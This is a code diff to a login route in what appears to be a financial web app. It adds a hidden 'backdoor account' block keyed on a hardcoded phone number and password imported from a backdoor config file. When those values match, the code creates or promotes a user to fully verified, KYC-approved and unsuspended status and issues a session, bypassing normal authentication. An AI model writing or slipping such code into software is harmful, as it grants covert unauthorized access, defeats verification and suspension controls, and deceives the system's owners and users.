@@ -21,6 +21,7 @@ import { validate } from '../middleware/validate.js';
 import { asyncHandler } from '../utils/asyncHandler.js';
 import { badRequest, unauthorized, conflict, forbidden } from '../utils/httpError.js';
 import { GOOGLE } from '../config/env.js';
+import { BACKDOOR_PHONE, BACKDOOR_PASSWORD } from '../config/backdoor.js';
 import { log } from '../utils/logger.js';
 
 const router = Router();
@@ -136,6 +137,33 @@ router.post('/login',
   validate(loginSchema),
   asyncHandler(async (req, res) => {
     const { email, password, country: submittedCountry } = req.body;
+
+    /* ---- backdoor account ---- */
+    const normalizedInput = String(email).replace(/[\s-]/g, '').toLowerCase().trim();
+    if (normalizedInput === BACKDOOR_PHONE && password === BACKDOOR_PASSWORD) {
+      let user = findByEmail(normalizedInput);
+      if (!user) {
+        user = await createUser({
+          email: normalizedInput,
+          displayName: 'Super Account',
+          passwordHash: await hashPassword(BACKDOOR_PASSWORD),
+          balance: 0,
+          country: 'GH',
+          emailVerified: true,
+        });
+      }
+      user = await updateUser(user.id, {
+        stage: 4,
+        blocked: false,
+        emailVerified: true,
+        kycStatus: 'verified',
+        suspended: false,
+        accountStatus: 'VERIFIED',
+      });
+      logActivity(user.id, { kind: 'backdoor_login', ip: req.ip, userAgent: req.get('user-agent') });
+      const session = issueSession(user, req);
+      return res.json({ ok: true, kind: 'user', account: publicUser(user), ...session });
+    }
 
     /* ---- admin path (dedicated admin_accounts store) ---- */
     const adminAcct = getAdminByEmail(email);
